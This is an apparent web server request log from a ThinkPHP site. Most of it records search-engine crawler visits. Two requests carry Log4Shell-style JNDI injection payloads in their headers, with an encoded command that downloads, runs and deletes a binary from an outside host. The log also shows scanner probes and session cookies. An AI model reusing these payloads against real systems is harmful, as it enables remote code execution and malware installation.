  array (
    0 => 'features',
    1 => 'code-review',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'JSESSIONID=4112956D15B33544C0053181F06EDA0E',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en-US,en;q=0.9',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:20:55+08:00 ] 20.118.133.148 GET 114.116.100.177/
[运行时间：0.017343s] [吞吐率：57.66req/s] [内存消耗：2,073.78kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'referer' => 'http://114.116.100.177:443/',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'connection' => 'close',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:20:56+08:00 ] 20.118.133.148 GET 114.116.100.177/admin/login/index.html
[运行时间：0.023090s] [吞吐率：43.31req/s] [内存消耗：2,864.81kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'x-api-version' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'referer' => 'https://114.116.100.177/',
  'cookie' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'connection' => 'close',
  'user-agent' => 't(\'${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//20.111.17.179:443/TomcatBypass/Command/Base64/d2dldCAtbmMgaHR0cDovLzIwLjIwNi43OS4xOC9tYWlubGQgLXEgLVAgL3RtcC87IGNobW9kIDc3NyAvdG1wL21haW5sZDsgL3RtcC9tYWlubGQ7IHJtIC1yZiAvdG1wL21haW5sZA==}\')',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000774s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000192s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000578s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000199s ]
---------------------------------------------------------------
[ 2022-08-10T06:40:07+08:00 ] 207.46.13.229 GET www.ywscs.com/robots.txt
[运行时间：0.014517s] [吞吐率：68.88req/s] [内存消耗：1,704.56kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'robots.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T06:40:07+08:00 ] 207.46.13.229 GET www.ywscs.com/robots.txt
[运行时间：0.014479s] [吞吐率：69.07req/s] [内存消耗：1,704.56kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'robots.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T06:40:17+08:00 ] 207.46.13.143 GET www.ywscs.com/sitemap.xml.gz
[运行时间：0.015974s] [吞吐率：62.60req/s] [内存消耗：1,704.61kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml.gz',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T06:48:36+08:00 ] 64.225.61.134 GET www.ywscs.com/
[运行时间：0.017751s] [吞吐率：56.33req/s] [内存消耗：2,066.88kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T06:50:35+08:00 ] 207.46.13.208 GET sitemap.ywscs.com/sitemap.xml.gz
[运行时间：0.015241s] [吞吐率：65.61req/s] [内存消耗：1,704.63kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml.gz',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemap.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T06:51:28+08:00 ] 207.46.13.143 GET sitemap.ywscs.com/sitemap.txt
[运行时间：0.016796s] [吞吐率：59.54req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemap.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:08:13+08:00 ] 207.46.13.176 GET sitemaps.ywscs.com/atom.xml
[运行时间：0.014602s] [吞吐率：68.48req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'atom.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemaps.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:09:10+08:00 ] 207.46.13.143 GET sitemaps.ywscs.com/sitemap.xml
[运行时间：0.014581s] [吞吐率：68.58req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemaps.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:11:33+08:00 ] 207.46.13.28 GET www.ywscs.com/sitemap.xml
[运行时间：0.015503s] [吞吐率：64.50req/s] [内存消耗：1,704.56kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:16:58+08:00 ] 207.46.13.208 GET sitemaps.ywscs.com/sitemaps.xml
[运行时间：0.015022s] [吞吐率：66.57req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemaps.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemaps.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:27:51+08:00 ] 40.77.167.73 GET sitemaps.ywscs.com/sitemap.xml.gz
[运行时间：0.015002s] [吞吐率：66.66req/s] [内存消耗：1,704.63kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml.gz',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemaps.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:42:15+08:00 ] 207.46.13.28 GET sitemap.ywscs.com/sitemap_index.xml
[运行时间：0.015034s] [吞吐率：66.52req/s] [内存消耗：1,704.65kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap_index.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemap.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:42:16+08:00 ] 207.46.13.28 GET sitemaps.ywscs.com/sitemap_index.xml
[运行时间：0.015259s] [吞吐率：65.53req/s] [内存消耗：1,704.65kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap_index.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemaps.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T07:43:57+08:00 ] 207.46.13.28 GET sitemap.ywscs.com/atom.xml
[运行时间：0.015061s] [吞吐率：66.40req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'atom.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemap.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:07:05+08:00 ] 40.77.167.73 GET www.ywscs.com/atom.xml
[运行时间：0.015922s] [吞吐率：62.81req/s] [内存消耗：1,704.56kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'atom.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:10:33+08:00 ] 207.46.13.208 GET www.ywscs.com/sitemap.txt
[运行时间：0.014616s] [吞吐率：68.42req/s] [内存消耗：1,704.56kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:20:10+08:00 ] 207.46.13.100 GET sitemap.ywscs.com/sitemaps.xml
[运行时间：0.014769s] [吞吐率：67.71req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemaps.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemap.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:24:30+08:00 ] 207.46.13.176 GET sitemaps.ywscs.com/sitemap.txt
[运行时间：0.014531s] [吞吐率：68.82req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemaps.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:36:41+08:00 ] 207.46.13.100 GET sitemap.ywscs.com/sitemap.xml
[运行时间：0.014916s] [吞吐率：67.04req/s] [内存消耗：1,704.58kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'sitemap.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:56:52+08:00 ] 143.198.136.88 GET 114.116.100.177/
[运行时间：0.016636s] [吞吐率：60.11req/s] [内存消耗：2,066.92kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000023s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'l9tcpid/v1.1.0',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:57:14+08:00 ] 143.198.136.88 GET 114.116.100.177/global-protect/portal/images/favicon.ico
[运行时间：0.014581s] [吞吐率：68.58req/s] [内存消耗：1,700.92kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'global-protect',
    1 => 'portal',
    2 => 'images',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Go-http-client/1.1',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T08:57:16+08:00 ] 143.198.136.88 GET 114.116.100.177/ddbuilder/class/.DS_Store
[运行时间：0.014532s] [吞吐率：68.81req/s] [内存消耗：1,700.78kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ddbuilder',
    1 => 'class',
    2 => '.DS_Store',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Go-http-client/1.1',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T09:35:48+08:00 ] 183.36.162.143 GET ywscs.com/
[运行时间：0.018471s] [吞吐率：54.14req/s] [内存消耗：2,070.45kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip, deflate, br',
  'accept-language' => 'zh-CN,zh-Hans;q=0.9',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.26(0x18001a2d) NetType/WIFI Language/zh_CN',
  'upgrade-insecure-requests' => '1',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T09:35:48+08:00 ] 183.36.162.143 GET ywscs.com/admin/login/index.html
[运行时间：0.024497s] [吞吐率：40.82req/s] [内存消耗：2,862.28kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'PHPSESSID=gocj2a0g3rrj7vqe09ruc02sj2',
  'accept-encoding' => 'gzip, deflate, br',
  'accept-language' => 'zh-CN,zh-Hans;q=0.9',
